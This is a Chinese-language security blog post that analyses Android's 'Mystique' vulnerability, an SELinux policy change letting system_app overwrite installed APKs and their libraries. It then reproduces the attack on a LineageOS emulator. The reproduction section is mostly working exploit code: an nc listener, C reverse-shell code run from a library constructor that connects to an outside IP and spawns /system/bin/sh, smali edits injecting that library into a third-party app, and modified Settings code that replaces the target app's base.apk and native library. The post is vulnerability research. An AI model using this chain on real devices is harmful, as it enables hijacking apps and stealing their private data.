---
layout: article

title:  京东安全发现的魔形女漏洞分析
date:   2021-11-21 21:23:00 +0800
tags: Android Security
key: jd_mystique
---


![graph]({{"/assets/pictures/security/jd_intro.png" | prepend:site.baseurl}})

根据[魔形女漏洞](https://dawnslab.jd.com/mystique/)网站介绍，可以看到其漏洞可以：

* 打破应用沙箱机制
* 可攻击其他 app，读取其 app 私有数据等

应用沙箱机制，Android 是使用了 Linux 多用户机制，即每个 app 单独 uid，漏洞竟然能打破这个？看到这个就非常好奇。

这个漏洞从公布我就一直关注，直到最近 AOSP 公开了修复 patch 才搞清楚到底是怎么回事，本文记录下该漏洞的原理和使用模拟器复现该漏洞。

<!--more-->

## 漏洞分析

### AOSP patch 分析

AOSP 针对漏洞发布了两个 CVE，CVE-2021-0515 和 CVE-2021-0691。

#### CVE-2021-0515

根据魔形女漏洞网站介绍，该漏洞实际上是本地权限提升漏洞，但结合 CVE-2021-0515 漏洞可进行远程攻击，CVE-2021-0515 修复的是 chromium 相关，是远程攻击链的重要一环，但不是魔形女漏洞最核心的。

#### CVE-2021-0691

![graph]({{"/assets/pictures/security/cve_intro.png" | prepend:site.baseurl}})

从 google 给的安全等级 Moderate 可以看到，危害并不高，但从上面漏洞描述来看，可以绕过应用沙箱机制，难道危害不高吗？

分析 patch：

```bash
--- a/prebuilts/api/30.0/private/system_app.te
+++ b/prebuilts/api/30.0/private/system_app.te
@@ -72,12 +72,6 @@
 # Settings need to access app name and icon from asec
 allow system_app asec_apk_file:file r_file_perms;
 
-# Allow system_app (adb data loader) to write data to /data/incremental
-allow system_app apk_data_file:file write;
-
-# Allow system app (adb data loader) to read logs
-allow system_app incremental_control_file:file r_file_perms;
-
 # Allow system apps (like Settings) to interact with statsd
 binder_call(system_app, statsd)

```

修复只是针对 system_app，system_app 是 uid = 1000 并且是系统签名的 apk，修复对 system_app 的权限进行了删除：

1. 去掉了对 apk_data_file 的写权限， /data/app(/.*)? 和 /data/incremental(/.*)? 目录为 apk_data_file
2. 去掉了对 incremental_control_file 的读文件权限，/data/incremental/MT_[^/] 目录为 incremental_control_file

/data/app 会包含有 app 信息，还有这些 app 所使用的 lib 库。而 /data/incremental 并没有有效文件。

#### 小结

1. 能理解危害只有 Moderate，漏洞只影响 system app，这种 app 只有系统厂家才能使用，漏洞利用有限，需要结合 system app 漏洞一起使用
2. 若存在 system app 任意代码执行或者任意文件写，可以对 /data/app 目录下 apk 和 lib 库进行修改替换，这样达到突破沙箱限制
3. 只能进行修改替换，不能新增文件，因为从现有的权限上看，没有创建文件和添加文件的权限，现有权限为：
![graph]({{"/assets/pictures/security/apk_perms.png" | prepend:site.baseurl}})

### 其他漏洞

#### 三星漏洞

![graph]({{"/assets/pictures/security/sam_cve.png" | prepend:site.baseurl}})

从描述上看，该漏洞是可以通用远程 socket 控制 system 用户写文件


## 总结

![graph]({{"/assets/pictures/security/da_intro.png" | prepend:site.baseurl}})

结合安全大牛徐昊中的评语和上述分析可知，漏洞主要是由于在 Android 11 上增加了 system_app 写 apk_data_file 的权限，在结合厂商的 system app 的漏洞，就可以对 /data/app 下文件进行修改替换，来得到访问/data/app下 app 的私有数据等信息。回过头来看，最开始的对该漏洞的描述，“攻击任何其他应用”描述过于夸大，其实只能攻击三方 app，或者升级后的系统 app，这样的 app 才会将 apk 保存在 /data/app 目录。


## 复现漏洞

漏洞需要结合 system app漏洞，为了方便复现，我这边使用有源码的 lineageos 的模拟器操作，（为什么使用这个？因为我最近刚编译了这个^_^）system app 漏洞可以直接在 settings 上修改。利用的话就是反弹 shell，目标 apk 选择了开源文件管理 [AmazeFileManager](https://github.com/TeamAmaze/AmazeFileManager)，使用这个 apk 是由于该 apk 包含有 x86 的 so 文件，模拟器是 x86 架构，不能运行 arm 架构，若是有真机，完全可以对任意 app 进行操作。

### 复现思路

1. 本地开启 nc server
2. 反射 shell 代码编译成单独的 so
3. 然后使用 apktool 工具修改目标 apk 的 smali，将 so 加载进去，获取到修改后的 apk
4. 在 settings 上编写代码，修改替换 apk 的 base.apk 和 so 文件

#### 开启 nc server

``` bash

nc -vv -l -p 8888  # 本地端口 8888

```

#### 反射 shell 代码

核心代码

```c

void create_reverseshell() {
    LOGD("In new thread\n");
    int port = 8888;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    LOGD("socket:%d %d\n", sockt, errno);
    if (sockt < 0) {
        LOGD("error socket");
        return;
    }
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("XXX.XXX.XXX.XXX"); // nc server IP

    int result = connect(sockt, (struct sockaddr *) &revsockaddr,
            sizeof(revsockaddr));
    LOGD("connect:%d %d\n", result, errno);
    if (result <0) {
        return;
    }
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/system/bin/sh", NULL};
    execve("/system/bin/sh", argv, NULL);
}

__attribute__((constructor)) void init_function() {  // so 加载后创建

    LOGD("Create new thread\n");
    int childid = fork();
    if (childid == 0) {
        create_reverseshell();
    }
}

```

#### apk 修改

![graph]({{"/assets/pictures/security/path_info.png" | prepend:site.baseurl}})

由于我们有 so 文件，所以需要修改的有 base.apk 和 lib 下的 librootoperations.so 文件，上面分析过，不能添加文件，只能替换，所以需要将我们的 so 替换成 librootoperations.so。

{:.warning}
当然也可以用 java 实现反射 shell 的逻辑，这样就不用修改 so 了

我们将 so 加载放到第一个 activity 里面，修改如下：

```java
.class public Lcom/amaze/filemanager/ui/activities/MainActivity;
.super Lcom/amaze/filemanager/ui/activities/superclasses/PermissionsActivity;
.source "MainActivity.java"

.method static constructor <clinit>()V
    .locals 1
    const-string v0, "rootoperations" # 我们添加
    invoke-static {v0}, Ljava/lang/System;->loadLibrary(Ljava/lang/String;)V # 我们添加

```

修改完后用 "apktool b" 重新打包并签名，用于后续使用

#### Settings 的修改

我们在开发者选项中增加了修改替换的逻辑，这样打开开发者选项就能触发，将要修改的 apk 和 so 放到 settings 的 files 目录下， 方便操作：

```java

package com.android.settings.development;
... ...
public class DevelopmentSettingsDashboardFragment extends RestrictedDashboardFragment
        implements SwitchBar.OnSwitchChangeListener, OemUnlockDialogHost, AdbDialogHost,
        AdbClearKeysDialogHost, LogPersistDialogHost,
        BluetoothA2dpHwOffloadRebootDialog.OnA2dpHwDialogConfirmedListener,
        AbstractBluetoothPreferenceController.Callback {
... ...

    public void onActivityCreated(Bundle icicle) {
        super.onActivityCreated(icicle);
        // Apply page-level restrictions
        setIfOnlyAvailableForAdmins(true);
        Log.d("CVE-TEST", "[+]begin replace");
        try {
            String path = SystemProperties.get("sys.target.path"); // 获取目标 APP 路径
            if (TextUtils.isEmpty(path)) {
                Log.d("CVE-TEST", "[-]can not get path from 'sys.target.path'");
            } else {
                File rootPath = new File(path);
                File sourceBase = new File(getActivity().getFilesDir(), "base.apk");
                File targetBase = new File( rootPath, "base.apk");
                copyFile(sourceBase, targetBase);
                Log.d("CVE-TEST", "[+]replace file: " + targetBase.getAbsolutePath());
                File sourceLib = new File(getActivity().getFilesDir(), "libreverse_shell.so");
                File targetLib = new File(rootPath,"lib/x86_64/librootoperations.so");
                copyFile(sourceLib, targetLib);
                Log.d("CVE-TEST", "[+]replace file: " + targetLib.getAbsolutePath());
                Log.d("CVE-TEST", "[+]replace done");
            }

        } catch (Exception e) {
        }
    ... ...
    }

}

    private void copyFile(File source, File  target) {
        try {
            java.io.FileInputStream fosfrom = new java.io.FileInputStream(source);
            java.io.FileOutputStream fosto = new java.io.FileOutputStream(target);
            byte bt[] = new byte[1024];
            int num;
            while ((num = fosfrom.read(bt)) > 0) {
                fosto.write(bt, 0, num);
            }
            fosfrom.close();
            fosto.close();

        } catch (Exception ex) {
        }
    }

```
#### 代码

[代码相关](/assets/code/jd_mystique_code.zip)

### 复现步骤

1. 电脑端开启 nc server，端口为 8888
2. 打开开发者选项，触发修改 base.apk 和 librootoperations.so 文件
3. 打开目标 APP，执行开启反射 shell 的 so
4. 电脑端 nc server 收到连接请求，此时可查询目标 APP 的私有目录

### 演示


<video class="videoElement" src="/assets/videos/systemapp-poc.webm" controls
            preload="auto" width="80%" height="100%"></video>

